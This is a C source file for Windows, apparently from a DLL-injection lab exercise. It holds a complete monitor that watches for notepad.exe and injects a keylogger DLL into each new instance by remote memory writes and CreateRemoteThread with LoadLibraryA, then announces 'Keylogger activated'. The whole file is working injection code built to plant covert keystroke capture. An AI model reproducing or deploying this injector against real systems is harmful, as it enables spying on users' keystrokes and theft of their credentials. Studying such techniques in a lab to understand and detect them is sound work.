#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define TARGET_PROCESS "notepad.exe"
#define DLL_PATH "C:\\Users\\namkg\\Downloads\\dll-injection-lab-main\\dll-injection-lab-main\\week4-dll-injection\\keylogger_dll.dll"
#define MAX_INJECTED 100

static DWORD g_injectedPIDs[MAX_INJECTED] = {0};
static int g_injectedCount = 0;

BOOL IsAlreadyInjected(DWORD pid) {
    for (int i = 0; i < g_injectedCount; i++) {
        if (g_injectedPIDs[i] == pid) {
            return TRUE;
        }
    }
    return FALSE;
}

void AddInjectedPID(DWORD pid) {
    if (g_injectedCount < MAX_INJECTED) {
        g_injectedPIDs[g_injectedCount++] = pid;
    }
}

BOOL InjectDLL(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        printf("[-] Failed to open process (PID: %d)\n", processID);
        return FALSE;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(DLL_PATH) + 1, 
                                          MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, DLL_PATH, 
                           strlen(DLL_PATH) + 1, NULL)) {
        printf("[-] Failed to write memory\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), 
                                                  "LoadLibraryA");
    if (!pLoadLibrary) {
        printf("[-] Failed to get LoadLibraryA address\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                        pRemoteMemory, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

BOOL IsProcessRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess) {
        CloseHandle(hProcess);
        return TRUE;
    }
    return FALSE;
}

void CleanupDeadProcesses() {
    for (int i = 0; i < g_injectedCount; i++) {
        if (!IsProcessRunning(g_injectedPIDs[i])) {
            // 죽은 프로세스 제거
            for (int j = i; j < g_injectedCount - 1; j++) {
                g_injectedPIDs[j] = g_injectedPIDs[j + 1];
            }
            g_injectedCount--;
            i--;
        }
    }
}

int main() {
    printf("=================================\n");
    printf("Auto DLL Injection Monitor\n");
    printf("=================================\n");
    printf("Target: %s\n", TARGET_PROCESS);
    printf("Monitoring... Press Ctrl+C to stop\n\n");

    while (1) {
        // 죽은 프로세스 정리
        CleanupDeadProcesses();
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, TARGET_PROCESS) == 0) {
                    DWORD pid = pe32.th32ProcessID;
                    
                    // 이미 주입했는지 확인
                    if (!IsAlreadyInjected(pid)) {
                        printf("[!] NEW TARGET DETECTED!\n");
                        printf("[*] Process: %s (PID: %d)\n", TARGET_PROCESS, pid);
                        
                        Sleep(500);  // 프로세스 안정화 대기
                        
                        printf("[+] Injecting into PID: %d\n", pid);
                        if (InjectDLL(pid)) {
                            printf("[+] DLL injected successfully!\n");
                            printf("[SUCCESS] Keylogger activated!\n\n");
                            AddInjectedPID(pid);
                        } else {
                            printf("[-] Injection failed!\n\n");
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        Sleep(1000);
    }

    return 0;
}
